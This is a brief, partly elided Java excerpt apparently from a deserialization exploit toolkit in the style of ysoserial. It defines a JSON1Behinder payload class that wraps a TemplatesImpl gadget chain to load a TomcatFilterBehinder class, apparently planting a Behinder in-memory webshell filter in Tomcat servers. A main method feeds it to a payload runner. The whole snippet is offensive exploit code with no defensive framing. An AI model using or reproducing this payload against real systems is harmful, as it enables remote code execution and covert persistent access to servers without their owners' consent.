...
public class JSON1Behinder implements ObjectPayload<Object> {

    public Map getObject ( String command ) throws Exception {
        return makeCallerChain(Gadgets.createTemplatesImpl(null, TomcatFilterBehinder.class), Templates.class);
    }
    ...
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(JSON1Behinder.class, args);
    }
